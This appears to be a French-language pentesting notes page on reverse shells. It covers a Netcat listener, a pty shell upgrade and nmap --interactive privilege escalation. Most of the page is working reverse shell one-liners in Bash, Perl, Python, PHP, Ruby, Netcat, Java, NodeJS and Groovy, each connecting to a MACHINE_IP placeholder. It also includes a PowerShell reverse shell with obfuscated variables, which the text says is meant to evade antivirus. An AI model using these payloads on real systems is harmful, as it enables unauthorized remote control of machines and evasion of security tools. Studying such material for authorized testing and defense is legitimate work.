
  
Un reverse shell est un [[Shell_explanation]] entre une machine cible et la notre.

## __Setup Netcat Listener__

Démarrage d’un serveur **Netcat** pour être à l’**écoute d’un port**.

```shell
user@ip:~$ rlwrap nc -vnlp 1234
```

Attendez que votre [script](#__Scripts__) soit éxécuté.

Une fois le reverse shell en marche, pour switcher vers un **fully interactive shell**.

```shell
$ python -c 'import pty; pty.spawn("/bin/bash")';
```

On peut ensuite utiliser **`su`** pour se connecter.

## __Nmap --interactive__

**Seulement pour les version 2.02 à 5.21**
Si notre utilisateur a les permissions d'utiliser nmap, on peut utiliser [nmap pour se connecter en root](https://gtfobins.github.io/gtfobins/nmap/#shell) sur notre shell, pour cela :

```shell
user@linux:/$ nmap --interactive
nmap> !sh
```

C'est une des astuces disponibles dans [Privilege_Escalation](Privilege_Escalation.md).

## __Scripts__

Pour générer des reverses shells vous pouvez utiliser le site de 0day, [revshells](https://www.revshells.com/)
Vous pouvez aussi utiliser [ce git](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)

### Bash

```bash
bash -i >& /dev/tcp/MACHINE_IP/1234 0>&1
```

### Perl

```perl
perl -e 'use Socket;$i="MACHINE_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MACHINE_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Php

```php
php -r '$sock=fsockopen("MACHINE_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

ou 

[Celui ci](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), mais windows defender le supprimera.

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("MACHINE_IP",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```shell
nc -e /bin/sh MACHINE_IP 1234
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/MACHINE_IP/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "MACHINE_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

### Groovy

```groovy
String host="MACHINE_IP";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
	while(pi.available()>0)so.write(pi.read());
	while(pe.available()>0)so.write(pe.read());
	while(si.available()>0)po.write(si.read());
	so.flush();
	po.flush();Thread.sleep(50);
	try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

### Powershell

Ce shell est chiffré en [base64](Encryption_Chiffrement) car il est repéré par la plupart des antivirus windows. 

```powershell
"$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); [byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0}; while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d); $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19); $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()}; $84b5d7ab8755451cb386a79589e39fa8.Close()"
```